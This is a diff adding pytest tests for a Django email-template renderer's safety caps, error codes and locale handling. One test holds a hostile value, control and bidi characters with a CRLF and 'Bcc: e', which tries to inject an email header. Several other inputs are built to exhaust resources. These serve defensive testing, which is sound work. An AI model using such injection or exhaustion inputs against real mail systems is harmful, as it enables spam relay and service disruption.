+    """Property 4 (p1, q6): a lookup lands on a key; a dict's, list's or str's methods are never reached."""
+
+    del plain
+    names = ("items", "values", "keys", "popitem", "clear")
+    template = _mail(
+        "".join(f"[{{{{ order.{name}|default:'' }}}}]{{% if order.{name} %}}T{{% endif %}}" for name in names)
+        + "{{ order.total }}",
+        {**{f"order.{name}": "x" for name in names}, "order.total": "x"},
+    )
+    rendered = _render(template, {"order": {"total": 3, "card_last4": "4242", "email": "x@example.test"}}, kit)
+    assert "[][][][][]3" in rendered.plain_text and "4242" not in rendered.html
+    for source in ("{{ name.upper }}", "{{ items.clear }}", "{{ block.context }}", "{{ block.super }}"):
+        assert _refusals(_unsaved(source=source, variables={"name": "x", "items.*": "x"})), source
+    _row("part", "split", source="[{{ person.split|default:'' }}]", variables={"person.split": "x"})
+    _row("block", "isolated", source="<b>{{ brand.name }}{{ lang }}{{ dir }}{% if secret %}{{ secret }}{% endif %}</b>",
+         text_source="x", variables={"secret": "x"})
+    through = _mail('{% include "parts/split" with person=recipient only %}\n\n{% include "blocks/isolated" only %}',
+                    {"recipient.split": "x", "secret": "x"}, key="tests.through")
+    rendered = _render(through, {"secret": "kept out"}, kit)
+    assert "[]" in rendered.plain_text and "<b>Acmeenltr</b>" in rendered.html and "kept out" not in rendered.html
+    assert any("both as a list and as an object" in message for message in _refusals(_unsaved(
+        source="x", variables={"items.*": "x", "items.pop": "x"})))
+
+
+def test_required_values_and_shapes(plain: Any, kit: Any) -> None:
+    """Property 5: a required value missing or null refuses the send, naming it; shapes and JSON are checked."""
+
+    del plain
+    template = _mail(
+        "{{ order.total }} [{{ note|default:'' }}] [{% if coupon %}{{ coupon }}{% endif %}]",
+        {"order.total": "x", "note": "x", "coupon": "x"},
+    )
+    for values, refusal in (
+        ({}, "order.total is required"),
+        ({"order": {"total": None}}, "order.total is required"),
+        ({"order": "x"}, "order is an object"),
+        ({"order": {"total": object()}}, "not JSON"),
+        ({"order": {"total": 1}, "brand": "x"}, "brand is a name the mail supplies"),
+    ):
+        with pytest.raises(ValidationError, match=refusal):
+            _render(template, values, kit)
+    rendered = _render(template, {"order": {"total": 3}, "coupon": None, "note": None}, kit)
+    assert "3 [] []" in rendered.plain_text and "None" not in rendered.html
+    rendered = _render(template, {"order": {"total": SafeString("<b>3</b>")}}, kit)
+    assert "&lt;b&gt;3&lt;/b&gt;" in rendered.html
+
+
+def test_variables_caps(plain: Any) -> None:
+    """q1, q2, q6: a row declares at most 50 paths of 8 segments; ``D`` is one set; prepare() bounds the values."""
+
+    del plain
+    assert any("at most 50" in message for message in _refusals(_unsaved(
+        source="x", variables={f"v{index}": "x" for index in range(51)})))
+    assert any("more than 8" in message for message in _refusals(_unsaved(
+        source="x", variables={"a.b.c.d.e.f.g.h.i": "x"})))
+    _row("layout", "order", variables={"order": "x"})
+    assert any("is declared and so is order.total" in message for message in _refusals(_unsaved(
+        source="x", layout="order", variables={"order.total": "x"})))
+    wide = _walk(_unsaved(source="{% for i in items %}{{ i.k00|default:'' }}{% endfor %}",
+                          variables={f"items.*.k{index:02}": "x" for index in range(50)}))
+    with _within(0.5):
+        filled = wide.prepare({"items": [{} for _ in range(500)]})
+    assert len(filled["items"]) == 500 and filled["items"][0]["k49"] == ""
+    walk = _walk(_unsaved(source="{% for i in items %}{{ i }}{% endfor %}", variables={"items.*": "x"}))
+    for values, refusal in (
+        ({"items": [0] * 501}, "501 list items"),
+        ({"items": ["x" * 10_001]}, "over 10000 characters"),
+        ({"items": ["x" * 9_000] * 6}, "characters of JSON"),
+    ):
+        with pytest.raises(ValidationError, match=refusal):
+            walk.prepare(values)
+
+
+def test_subject_preheader_and_plain_text(plain: Any, kit: Any) -> None:
+    """Property 6: one line each; a value's markup is escaped in the title; the plain text holds values as they are."""
+
+    del plain
+    template = _mail("Hi {{ name }}.", {"name": "x"}, subject="{{ name }}\nsecond line\tend",
+                     preheader="{{ name }}\r\nmore")
+    rendered = _render(template, {"name": "<b>Ana</b>"}, kit)
+    assert rendered.subject == "<b>Ana</b> second line end" and rendered.preheader == "<b>Ana</b> more"
+    assert "<title>&lt;b&gt;Ana&lt;/b&gt; second line end</title>" in rendered.html
+    assert "Hi <b>Ana</b>." in rendered.plain_text
+    assert "more" not in rendered.plain_text and "{" not in rendered.plain_text
+
+
+def test_written_past_clean_fails_the_render_before_it_renders(plain: Any, kit: Any) -> None:
+    """Property 8: a broken row, a cycle or a broken kit seed fails render() with ValidationError; preview says so."""
+
+    del plain
+    broken = _mail("{{ x|safe }}")
+    with pytest.raises(ValidationError, match="does not compile"):
+        _render(broken, {}, kit)
+    _row("part", "cycle", source='{% include "parts/cycle" only %}')
+    cyclic = _mail('{% include "parts/cycle" only %}', key="tests.cycle")
+    with pytest.raises(ValidationError, match="includes itself"):
+        _render(cyclic, {}, kit)
+    with system_context(reason="tests.messaging_templates.render.preview"):
+        preview = cyclic.preview(kit=kit)
+    assert preview.rendered is None and [warning.code for warning in preview.warnings] == [
+        TemplateWarningCode.RENDER_ERROR]
+    fine = _mail("Fine.", key="tests.fine")
+    with system_context(reason="tests.messaging_templates.render.seed"):
+        BrandKit.objects.filter(pk=kit.pk).update(brand="not a colour")
+        stale = BrandKit.objects.get(pk=kit.pk)
+    with pytest.raises(ValidationError):
+        _render(fine, {}, stale)
+
+
+def test_no_default_kit_refuses_the_render(plain: Any) -> None:
+    del plain
+    fine = _mail("Fine.")
+    with system_context(reason="tests.messaging_templates.render.kit"):
+        BrandKit.objects.filter(is_default=True).update(is_default=False)
+    with pytest.raises(ValidationError, match="No brand kit is the default"):
+        _render(fine, {})
+
+
+def test_an_override_saved_between_two_renders_shows_in_the_second(plain: Any, kit: Any) -> None:
+    del plain
+    shipped = _row("part", "word", source="First.", is_baseline=True)
+    template = _mail('{% include "parts/word" only %}')
+    assert "First." in _render(template, {}, kit).plain_text
+    with system_context(reason="tests.messaging_templates.render.edit"):
+        override = MessageTemplate.objects.override(shipped)
+        override.source = "Second."
+        override.save()
+    assert "Second." in _render(template, {}, kit).plain_text
+
+
+@pytest.mark.parametrize(
+    ("language", "date", "direction"),
+    [
+        ("en", "Nov. 24, 2026", "ltr"),
+        ("es", "24 de noviembre de 2026", "ltr"),
+        ("de", "24. November 2026", "ltr"),
+        ("ar", "24 نوفمبر، 2026", "rtl"),
+        ("he", None, "rtl"),
+        ("fa", None, "rtl"),
+    ],
+)
+def test_dates_numbers_and_direction_follow_the_rows_language(
+    plain: Any, kit: Any, language: str, date: str | None, direction: str,
+) -> None:
+    """Property 9: each pass runs in the row's language; a date path takes a date or an aware datetime."""
+
+    del plain
+    template = _mail("{{ when|date:'DATE_FORMAT' }}|{{ dir }}|{{ ok|yesno }}", {"when": "x", "ok": "x"},
+                     language=language, key="tests.dated")
+    rendered = _render(template, {"when": datetime.date(2026, 11, 24), "ok": True}, kit)
+    assert rendered.language == language
+    assert f'dir="{direction}"' in rendered.html and f"|{direction}|" in rendered.plain_text
+    if date is not None:
+        assert rendered.plain_text.startswith(date)
+
+
+def test_cheap_filters_spend_a_constant_and_a_raw_number_is_text(plain: Any, kit: Any) -> None:
+    """A subject and preheader showing snippets of one long value fit their budget: default, length and yesno read
+    nothing. A number too large for a float is refused only where floatformat or pluralize reads it."""
+
+    del plain
+    message = "word " * 2_000
+    snippets = _mail(
+        "Body.", {"name": "x", "message": "x"}, key="tests.snippets",
+        subject="{{ name }}: {{ message|default:''|truncatechars:40 }}{% if message|length > 40 %}!{% endif %}",
+        preheader="{{ message|default:''|truncatechars:90 }}",
+    )
+    rendered = _render(snippets, {"name": "Ana", "message": message}, kit)
+    assert rendered.subject.startswith("Ana: word") and rendered.subject.endswith("!")
+    raw = _mail("Order {{ number }}.", {"number": "x"}, key="tests.huge")
+    for number in (2 ** 60, 10 ** 308, 10 ** 309, float("inf")):
+        assert _render(raw, {"number": number}, kit).plain_text.startswith("Order ")
+
+
+def test_the_markdown_pass_reads_internals_markdown_it_still_has() -> None:
+    """The guard a markdown-it-py upgrade runs: the manifest caps it below 5, and these are what the pass reads."""
+
+    assert markdown_it.__version__.split(".")[0] == "4"
+    assert str(inspect.signature(parseLinkLabel)) == (
+        "(state: markdown_it.rules_inline.state_inline.StateInline, start: int, disableNested: bool = False) -> int"
+    )
+    state = StateInline("x", MarkdownIt(), {}, [])
+    for name in ("src", "pos", "posMax", "env", "md", "tokens"):
+        assert hasattr(state, name), name
+    assert list(inspect.signature(StateInline.push).parameters) == ["self", "ttype", "tag", "nesting"]
+    assert list(inspect.signature(RendererHTML.renderToken).parameters) == ["self", "tokens", "idx", "options", "env"]
+    parser = MarkdownIt("commonmark")
+    for method in ("normalizeLink", "validateLink", "add_render_rule"):
+        assert callable(getattr(parser, method)), method
+    assert callable(parser.inline.ruler.before) and callable(parser.core.ruler.push)
+    tokens = parser.parse("# Title\n\n[a](https://example.test/) **b**\n")
+    assert [token.type for token in tokens] == [
+        "heading_open", "inline", "heading_close", "paragraph_open", "inline", "paragraph_close"]
+    for name in ("type", "tag", "content", "info", "attrs", "children", "hidden", "map", "nesting"):
+        assert hasattr(tokens[4], name), name
+    assert [child.type for child in tokens[4].children or ()] == [
+        "link_open", "text", "link_close", "text", "strong_open", "text", "strong_close", "text"]
+
+
+def test_only_a_validation_error_leaves_render_and_preview(plain: Any, kit: Any) -> None:
+    """Django review 2 (a3, a2, q7, q10): values the walk admits that Django's filters would raise on are refused,
+    naming the path; a bare date printed with a time takes an aware datetime; preview reports the refusal."""
+
+    del plain
+    numbers = _mail("[{{ n|pluralize }}][{{ n|floatformat:2 }}][{{ n|yesno }}][{{ n }}]", {"n": "x"}, key="tests.n")
+    for number in (10 ** 400, -(10 ** 400), float("inf"), float("nan")):
+        with pytest.raises(ValidationError, match="n is not a number a float holds"):
+            _render(numbers, {"n": number}, kit)
+    assert _render(numbers, {"n": 1e308}, kit).plain_text.startswith("[s]")
+    printed = {"d": "DATETIME_FORMAT", "e": "H:i", "f": "TIME_FORMAT", "g": "SHORT_DATETIME_FORMAT"}
+    timed = _mail("".join(f"[{{{{ {path}|date:'{name}' }}}}]" for path, name in printed.items()),
+                  dict.fromkeys(printed, "x"), key="tests.timed")
+    moments = dict.fromkeys(printed, "2026-11-24T10:00:00+00:00")
+    assert _render(timed, moments, kit).plain_text.count("[") == 4
+    for path, name in printed.items():
+        with pytest.raises(ValidationError, match=f"{path} is printed with a time \\({name}\\)"):
+            _render(timed, {**moments, path: "2026-11-24"}, kit)
+    dated = _mail("[{{ d|date:'DATE_FORMAT' }}]", {"d": "x"}, key="tests.far")
+    for moment in ("9999-12-31T23:59:59-23:59", "0001-01-01T00:00:00+23:59"):
+        with pytest.raises(ValidationError, match="d is a moment the local time zone cannot hold"):
+            _render(dated, {"d": moment}, kit)
+    epoch = _mail("[{{ d|date:'U' }}]", {"d": "x"}, key="tests.epoch")
+    for zone in ("UTC", "Pacific/Kiritimati"):
+        for day in ("0001-01-01", "9999-12-31", "2026-11-24"):
+            with timezone.override(zoneinfo.ZoneInfo(zone)):
+                try:  # The contract: a refusal is a ValidationError, never another exception.
+                    _render(epoch, {"d": day}, kit)
+                except ValidationError:
+                    pass
+    with system_context(reason="tests.messaging_templates.render.preview"):
+        timed.sample = {**moments, "d": "2026-11-24"}
+        preview = timed.preview(kit=kit)
+    assert preview.rendered is None and [warning.code for warning in preview.warnings] == [
+        TemplateWarningCode.RENDER_ERROR]
+    assert "d is printed with a time" in preview.warnings[0].detail
+
+
+def _failing(raised: type[BaseException]) -> Any:
+    def upper(value: Any) -> str:
+        raise raised("a filter nobody thought of")
+
+    upper._filter_name = "upper"  # type: ignore[attr-defined]  # what Library.filter records
+    return upper
+
+
+@pytest.mark.parametrize("raised", [RuntimeError, ZeroDivisionError, ValueError])
+def test_any_other_failure_is_logged_then_refused_as_render_failed(
+    plain: Any, kit: Any, monkeypatch: pytest.MonkeyPatch, caplog: pytest.LogCaptureFixture, raised: type[Exception],
+) -> None:
+    """Section 4: what nobody thought of is logged with its traceback, then leaves as render_failed; preview says so."""
+
+    del plain
+    monkeypatch.setitem(register.filters, "upper", _failing(raised))
+    template = _mail("{{ name|upper }}", {"name": "x"}, sample={"name": "Ana"})
+    with caplog.at_level(logging.ERROR, logger="angee.messaging_templates.walker"):
+        with pytest.raises(ValidationError) as caught:
+            _render(template, {"name": "Ana"}, kit)
+        with system_context(reason="tests.messaging_templates.render.preview"):
+            preview = template.preview(kit=kit)
+    assert [item.code for item in caught.value.error_list] == ["render_failed"]
+    assert f"{raised.__name__}: a filter nobody thought of" in caught.value.messages[0]
+    assert preview.rendered is None
+    assert preview.warnings == [TemplateWarning(TemplateWarningCode.RENDER_ERROR, caught.value.messages[0])]
+    assert len(caplog.records) == 2 and all(record.exc_info for record in caplog.records)
+
+
+@pytest.mark.parametrize("raised", [MemoryError, RecursionError])
+def test_running_out_of_room_is_not_a_refusal(
+    plain: Any, kit: Any, monkeypatch: pytest.MonkeyPatch, raised: type[Exception],
+) -> None:
+    """MemoryError and RecursionError say the process ran out of room, not that the row cannot render."""
+
+    del plain
+    monkeypatch.setitem(register.filters, "upper", _failing(raised))
+    with pytest.raises(raised):
+        _render(_mail("{{ name|upper }}", {"name": "x"}), {"name": "Ana"}, kit)
+
+
+def test_the_walk_and_the_warnings_are_inside_the_contract(
+    plain: Any, kit: Any, monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    """Section 4: a failure in the walk or in the preview's warnings leaves as a refusal, never as itself."""
+
+    del plain
+    template = _mail("{{ name }}", {"name": "x"}, sample={"name": "Ana"})
+    with monkeypatch.context() as patched:
+        patched.setattr(_TreeWalker, "close", lambda walker, tree: 1 / 0)
+        with pytest.raises(ValidationError) as caught:
+            _render(template, {"name": "Ana"}, kit)
+        assert [item.code for item in caught.value.error_list] == ["render_failed"]
+        with system_context(reason="tests.messaging_templates.render.preview"):
+            assert template.preview(kit=kit).warnings[0].code == TemplateWarningCode.RENDER_ERROR
+    monkeypatch.setattr(TemplateWalk, "unused", property(lambda walk: 1 / 0))
+    with system_context(reason="tests.messaging_templates.render.preview"):
+        preview = template.preview(kit=kit)
+    assert preview.rendered is None and preview.warnings[0].code == TemplateWarningCode.RENDER_ERROR
+
+
+def test_a_caller_tells_each_refusal_apart_by_its_code(
+    plain: Any, kit: Any, monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    """Section 4: every item of a refusal carries its code in error_list, as the sending lane reads it."""
+
+    del plain
+
+    def codes(row: Any, values: dict[str, Any], kit: Any = kit) -> set[str | None]:
+        with pytest.raises(ValidationError) as caught:
+            _render(row, values, kit)
+        return {item.code for item in caught.value.error_list}
+
+    template = _mail("{{ order.total }} {{ name }}", {"order.total": "x", "name": "x"}, key="tests.codes")
+    assert codes(template, {"order": "x"}) == {"invalid_values"}
+    assert codes(template, {"order": {"total": None}, "name": None}) == {"invalid_values"}
+    assert codes(_mail("{{ x|safe }}", key="tests.broken"), {}) == {"message_template_refused"}
+    looping = _mail("{% for i in items %}" + "{{ i|upper }}{{ i|lower }}{{ i|title }}" * 2 + "{% endfor %}",
+                    {"items.*": "x"}, key="tests.looping")
+    assert codes(looping, {"items": ["a"] * 501}) == {"invalid_values"}
+    assert codes(looping, {"items": ["a" * 90] * 500}) == {"render_budget"}
+    long_subject = _mail("x", {"name": "x"}, key="tests.subject", subject="{{ name }}{{ name }}")
+    assert codes(long_subject, {"name": "n" * 600}) == {"subject_too_long"}
+    monkeypatch.setitem(register.filters, "upper", _failing(RuntimeError))
+    assert codes(looping, {"items": ["a"]}) == {"render_failed"}
+    with system_context(reason="tests.messaging_templates.render.kit"):
+        BrandKit.objects.filter(pk=kit.pk).update(is_default=False)
+    with pytest.raises(ValidationError) as caught, system_context(reason="tests.messaging_templates.render"):
+        template.render({"order": {"total": 1}, "name": "Ana"})
+    assert {item.code for item in caught.value.error_list} == {"no_brand_kit"}
+
+
+def test_a_lone_surrogate_is_refused_as_invalid_values(plain: Any, kit: Any) -> None:
+    """A value no mail can encode is refused in prepare(), never returned in a subject or raised from preview."""
+
+    del plain
+    template = _mail("Hello {{ name }}.", {"name": "x"}, subject="Hi {{ name }}", sample={"name": "a\ud800b"})
+    with pytest.raises(ValidationError, match="lone surrogate") as caught:
+        _render(template, {"name": "a\ud800b"}, kit)
+    assert {item.code for item in caught.value.error_list} == {"invalid_values"}
+    with system_context(reason="tests.messaging_templates.render.preview"):
+        assert template.preview(kit=kit).warnings[0].code == TemplateWarningCode.RENDER_ERROR
+
+
+def test_the_deepest_admitted_row_and_values_render(plain: Any, kit: Any) -> None:
+    """Section 4: tags nested 16 deep, three includes, two loops and eight-segment paths reach no RecursionError."""
+
+    del plain
+    nested = "\n".join(["{% if x %}"] * 16) + "{{ x }}" + "\n".join(["{% endif %}"] * 16)
+    _row("part", "depth3", source=nested, variables={"x": "x"})
+    _row("part", "depth2", source='{% include "parts/depth3" with x=x only %}', variables={"x": "x"})
+    _row("part", "depth1", source='{% include "parts/depth2" with x=x only %}', variables={"x": "x"})
+    deep = "a.b.c.d.e.f.g.h"
+    template = _mail(
+        "{% for o in outer %}\n\n{% for i in o.inner %}\n\n"
+        '{% include "parts/depth1" with x=i.v only %}\n\n{% endfor %}\n\n{% endfor %}\n\n{{ ' + deep + " }}",
+        {"outer.*.inner.*.v": "x", deep: "x"}, key="tests.deepest",
+    )
+    assert _refusals(template) == []
+    values: dict[str, Any] = {"outer": [{"inner": [{"v": "Deep"}] * 10}] * 10}
+    node = values
+    for segment in deep.split("."):
+        node = node.setdefault(segment, {}) if segment != "h" else node.setdefault(segment, "Eight")
+    assert _render(template, values, kit).plain_text.count("Deep") == 100
+
+
+def test_an_over_long_subject_is_refused_by_its_column_and_never_lexed(
+    plain: Any, monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    """Fix 1 (Django review 3): a column over its max_length refuses the row before the walk reads it."""
+
+    del plain
+    checked: list[Any] = []
+    _recording(monkeypatch, TemplateWalker, "check", lambda walker, row: checked.append(row))
+    row = _unsaved(subject="{{ a }}" * 7_000, preheader="x" * 50_000, variables={"a": "x"})
+    with system_context(reason="tests.messaging_templates.render.clean"), pytest.raises(ValidationError) as raised:
+        row.full_clean()
+    assert {"subject", "preheader"} <= set(raised.value.message_dict) and checked == []
+
+
+def test_the_values_cap_counts_characters_not_escapes(plain: Any) -> None:
+    """Fix 2 (Django review 4): 50,000 characters of JSON, whatever the script; escapes are not counted."""
+
+    del plain
+    walk = _walk(_unsaved(source="{% for i in items %}{{ i }}{% endfor %}", variables={"items.*": "x"}))
+    assert len(walk.prepare({"items": ["名" * 9_000] * 5})["items"]) == 5
+    assert len(walk.prepare({"items": ["😀" * 9_000] * 5})["items"]) == 5
+    with pytest.raises(ValidationError, match="characters of JSON"):
+        walk.prepare({"items": ["名" * 9_000] * 6})
+
+
+def test_subject_and_preheader_drop_control_and_bidirectional_characters(plain: Any, kit: Any) -> None:
+    """Fix 3 (Django review 8, i5): NUL, C0 and C1 controls and bidi overrides never reach a header line."""
+
+    del plain
+    template = _mail("Hi.", {"name": "x"}, subject="Hi {{ name }}", preheader="{{ name }}")
+    rendered = _render(template, {"name": "a\x00b\x1b[1m\u202eevil\u202c\u2066x\u2069\x85c\x9fd\r\nBcc: e"}, kit)
+    assert rendered.subject == "Hi ab[1mevilx cd Bcc: e" and rendered.preheader == "ab[1mevilx cd Bcc: e"
+
+
+def test_the_plain_text_body_never_reads_the_subject_or_the_preheader(plain: Any) -> None:
+    """D3 (i4): subject and preheader are read in the HTML form alone, the one pass that supplies them."""
+
+    del plain
+    _row("layout", "subjected", source=PLAIN_LAYOUT,
+         text_source="Subject: {{ subject }}\n\n{% block content %}{% endblock %}")
+    for row in (_unsaved(layout="subjected"), _unsaved(subject="{{ preheader }}"), _unsaved(
+            "layout", "other", source=PLAIN_LAYOUT, text_source="{{ preheader }}{% block content %}{% endblock %}")):
+        assert any("read in the HTML form alone" in refusal for refusal in _refusals(row)), row.key
+    assert _refusals(_unsaved()) == []
+
+
+def test_a_date_path_parses_iso_strings_and_refuses_what_is_not_a_date(plain: Any, kit: Any) -> None:
+    del plain
+    template = _mail("{{ when|date:'Y-m-d' }}", {"when": "x"})
+    assert _render(template, {"when": "2026-11-24"}, kit).plain_text.strip() == "2026-11-24"
+    with timezone.override(zoneinfo.ZoneInfo("Europe/Berlin")):
+        assert _render(template, {"when": "2026-11-24T23:30:00+00:00"}, kit).plain_text.strip() == "2026-11-25"
+    for value in ("2026-11-24T15:30:00", "2026-02-30", "soon", 12):
+        with pytest.raises(ValidationError, match="when is not a date"):
+            _render(template, {"when": value}, kit)
+
+
+# ---------- the probes, by name ----------
+
+
+def test_filter_cost_caps(plain: Any, kit: Any) -> None:
+    """p2, p13, q15: a long date format is refused at save, url reads 2,048 characters, every filter call charges."""
+
+    del plain
+    for refused in ("{{ d|date:'" + "r" * 21 + "' }}", "{{ d|date:'" + "r" * 190 + "_FORMAT' }}"):
+        assert any("a date format" in message for message in _refusals(_unsaved(source=refused, variables={"d": "x"})))
+    for admitted in ("{{ d|date:'" + "r" * 20 + "' }}", "{{ d|date:'SHORT_DATETIME_FORMAT' }}"):
+        assert _refusals(_unsaved(source=admitted, variables={"d": "x"})) == []
+    assert url("https://example.test/" + "é" * 2_030) == ""
+    loop = _mail(
+        "{% for i in items %}\n" + "\n".join(["{% with x=d|date:'rrrrrrrrrrrrrrrrrrrr' %}{% endwith %}" * 10] * 30)
+        + "\n{% endfor %}",
+        {"items.*": "x", "d": "x"}, format="html", text_source="x",
+    )
+    with _within(1.0):
+        with pytest.raises(RenderBudgetExceeded):
+            _render(loop, {"items": [0] * 500, "d": "2026-11-24T15:30:00+00:00"}, kit)
+
+
+def test_condition_filters_refused(plain: Any) -> None:
+    """p3: an if operand runs no filter but ``length``, so a condition costs nothing a budget does not see."""
+
+    del plain
+    for source in ('{% if v|url == "x" %}{% endif %}', '{% if w|truncatechars:9 == "x" %}{% endif %}',
+                   "{% if v|default:'x' %}{% endif %}"):
+        assert any("an if tests" in message for message in _refusals(_unsaved(
+            source=source, variables={"v": "x", "w": "x"}))), source
+    assert _refusals(_unsaved(source="{% if items|length > 2 %}{% endif %}", variables={"items.*": "x"})) == []
+
+
+def test_wrapper_refuses_author_blocks(plain: Any) -> None:
+    """p5: the layout column names the layout; a template writes neither extends nor block."""
+
+    del plain
+    for source in ("Hi{% endblock %} tail", "Hi{% endblock %}{% block x %}X", "{% block content %}Z{% endblock %}",
+                   "A{% block inner %}B{% endblock %}C", '{% extends "layouts/plain" %}'):
+        assert _refusals(_unsaved(source=source)), source
+    for layout in ("<p>No content</p>", "{% block content %}x{% endblock %}",
+                   "{% if lang %}{% block content %}{% endblock %}{% endif %}",
+                   "{% block content %}{% endblock %}{% block other %}{% endblock %}"):
+        assert any("a layout holds one empty" in message for message in _refusals(_unsaved(
+            "layout", "other", source=layout, text_source=PLAIN_TEXT))), layout
+    assert any("block is the layout's alone" in message for message in _refusals(_unsaved(
+        "block", "b", source="{% block x %}{% endblock %}", text_source="x")))
+
+
+def test_nesting_before_compile(plain: Any) -> None:
+    """p6: tags nest at most 16 deep, counted on the tokens; 400 levels are refused before Django compiles them."""
+
+    del plain
+    sixteen = "\n".join(["{% if a %}"] * 16) + "x" + "\n".join(["{% endif %}"] * 16)
+    assert _refusals(_unsaved(source=sixteen, variables={"a": "x"}, format="html", text_source="x")) == []
+    deep = "\n".join(["{% if a %}" * 25] * 16) + "\nx\n" + "\n".join(["{% endif %}" * 25] * 16)
+    with _within(0.5):
+        refusals = _refusals(_unsaved(source=deep, variables={"a": "x"}, format="html", text_source="x"))
+        assert any("nests tags over 16" in message for message in refusals)
+
+
+def test_expression_shapes(plain: Any, kit: Any) -> None:
+    """p7, q8: literals are strings or numbers; precision is parsed as floatformat parses it; filter arity holds."""
+
+    del plain
+    for source, refused in (
+        ("{{ 5 }}{{ 1.5 }}{{ 'x' }}", False),
+        ("{{ x|floatformat:' 7' }}", True),
+        ("{{ x|floatformat:'1_000' }}", True),
+        ("{{ x|floatformat:1e3 }}", True),
+        ("{{ x|floatformat:'6g' }}", False),
+        ("{{ x|linebreaksbr:'a' }}", True),
+        # Rule 5 refuses what Django's filters raise on rather than refuse (Django review 2, p7, q8).
+        ("{{ x|floatformat:'' }}", True),
+        ("{{ x|floatformat:1e400 }}", True),
+        ("{{ x|floatformat:'abc' }}", True),
+        ("{{ x|truncatechars:1e400 }}", True),
+        ("{{ x|truncatewords:'many' }}", True),
+        ("{{ x|yesno:1 }}", True),
+        ("{{ x|pluralize:2 }}", True),
+        ("{{ 'x'|date:'U' }}", True),
+        ("{{ lang|date:'U' }}", True),
+        ("{% for i in items %}{{ forloop.counter|date:'U' }}{% endfor %}", True),
+        ("{% with d=lang %}{{ d|date }}{% endwith %}", True),
+        ("{{ x|date:'U' }}{% with d=x %}{{ d|date }}{% endwith %}", False),
+        ("{{ x|yesno:'a,b' }}{{ x|pluralize:'es' }}{{ x|truncatechars:'5' }}{{ x|floatformat:'-2u' }}", False),
+        ("{% with x as y %}{{ y }}{% endwith %}", False),
+        ("{% for i in items reversed %}{{ i }}{% endfor %}", False),
+        ("{% if x|length > 2 and not y or y not in 'abc' %}z{% endif %}", False),
+    ):
+        refusals = _refusals(_unsaved(source=source, variables={"x": "x", "y": "x", "items.*": "x"},
+                                      format="html", text_source="x"))
+        assert bool(refusals) is refused, (source, refusals)
+    rendered = _render(_mail("{{ amount|floatformat:'2g' }}", {"amount": "x"}, language="de", key="tests.amount"),
+                       {"amount": Decimal("1234.5")}, kit)
+    assert rendered.plain_text.strip() == "1.234,50"
+
+
+def test_line_caps_bound_lexing(plain: Any) -> None:
+    """p8, p9, p15, q14c: what makes lexing or Markdown quadratic is refused before either runs."""
+
+    del plain
+    rows = {
+        "unclosed": "{{" * 25_000,
+        "brackets": ("[" * 999 + "\n") * 50,
+        "images": (("![" * 499)[:999] + "\n") * 50,
+        "long-line": "x" * 50_000,
+    }
+    for case, source in rows.items():
+        with _within(0.2, case):
+            assert _refusals(_unsaved(source=source)), case
+    with _within(1.0):
+        admitted = (("{{" * 30 + "x" * 999)[:999] + "\n") * 50
+        assert any("text holds {{" in message for message in _refusals(_unsaved(source=admitted)))
+
+
+def test_budget_sticky_through_if(plain: Any, kit: Any) -> None:
+    """p10, q9: once spent, every charge raises, even where an if operator swallowed the first; per thread and task."""
+
+    del plain, kit
+    engine = MessageTemplateEngine(autoescape=True)
+    swallowing = engine.from_string('{% if x|upper == "A" %}T{% else %}F{% endif %}' * 2 + "tail")
+    budget = RenderBudget(filter_input=150)
+    with pytest.raises(RenderBudgetExceeded), budget.spend():
+        swallowing.render(engine.context({"x": "a"}))
+    assert budget.exceeded and RENDER_BUDGET.get(None) is None
+    with pytest.raises(LookupError, match="RenderBudget.spend"):
+        engine.from_string("{{ x|upper }}").render(engine.context({"x": "a"}))
+    looping = engine.from_string("{% for i in items %}{{ i|upper }}{% endfor %}")
+    results: dict[int, Any] = {}
+
+    def worker(index: int, size: int) -> None:
+        try:
+            with RenderBudget().spend():
+                results[index] = len(looping.render(engine.context({"items": ["a"] * size})))
+        except RenderBudgetExceeded:
+            results[index] = "exceeded"
+
+    threads = [threading.Thread(target=worker, args=(index, 400 if index % 2 else 600)) for index in range(6)]
+    for thread in threads:
+        thread.start()
+    for thread in threads:
+        thread.join()
+    assert results == {index: 400 if index % 2 else "exceeded" for index in range(6)}
+
+    async def concurrently() -> list[Any]:
+        def render(size: int) -> int:
+            with RenderBudget().spend():
+                return len(looping.render(engine.context({"items": ["a"] * size})))
+
+        return list(await asyncio.gather(*(sync_to_async(render)(400) for _ in range(3))))
+
+    assert asyncio.run(concurrently()) == [400, 400, 400]
+    assert RENDER_BUDGET.get(None) is None
+
+
+def test_include_renders_charge_the_budget(plain: Any, kit: Any) -> None:
+    """p14: each include render charges an iteration, so includes in a loop stop at the pass's 500."""
+
+    del plain
+    _row("part", "empty", source="")
+    looping = _mail("{% for i in items %}\n\n" + '{% include "parts/empty" only %}\n\n' * 2 + "{% endfor %}",
+                    {"items.*": "x"})
+    with _within(1.0):
+        with pytest.raises(RenderBudgetExceeded):
+            _render(looping, {"items": [0] * 300}, kit)
+    assert _render(looping, {"items": [0] * 166}, kit).plain_text.strip() == ""
+
+
+def test_walk_stops_expanding_at_its_node_bound(plain: Any) -> None:
+    """Nodes count once per include site; past 1,000 the walk stops, so nested includes cannot multiply its work."""
+
+    del plain
+    fan = "\n".join([('{% include "blocks/next" only %}') * 30] * 10)
+    _row("block", "last", source="<b>x</b>", text_source="x")
+    _row("block", "next", source=fan.replace("blocks/next", "blocks/last"), text_source="x")
+    _row("block", "fan", source=fan, text_source="x")
+    template = _unsaved(source=fan.replace("blocks/next", "blocks/fan"), format="html", text_source="x")
+    with _within(1.0):
+        assert any("over 1000 nodes" in message for message in _refusals(template))
+
+
+def test_walk_character_cap(plain: Any) -> None:
+    """q4: the rows one walk reaches hold at most 150,000 characters, each counted before it is parsed."""
+
+    del plain
+    big = "\n".join(["x" * 999] * 50)
+    for index in range(4):
+        _row("part", f"big{index}", source=big)
+    template = _unsaved(source="\n\n".join(f'{{% include "parts/big{index}" only %}}' for index in range(4)))
+    with _within(2.0):
+        refusals = _refusals(template)
+        assert any("over 150000 characters" in message for message in refusals), refusals
+
+
+# ---------- the costliest work the caps admit: what it does, and its CPU on request ----------
+
+TIMED = pytest.mark.skipif(
+    not TIMED_RUN, reason="CPU-time bounds depend on the machine and its load; ANGEE_TIMED_TESTS=1 runs them",
+)
+"""The CPU bounds of the costliest passes and previews, run on request in the lane and at integration; the
+default suite pins the work the same cases do instead."""
+
+DEEP = "a." + ".".join(["b"] * 7)
+"""The longest path a row declares: eight segments."""
+
+R20 = "'" + "r" * 20 + "'"
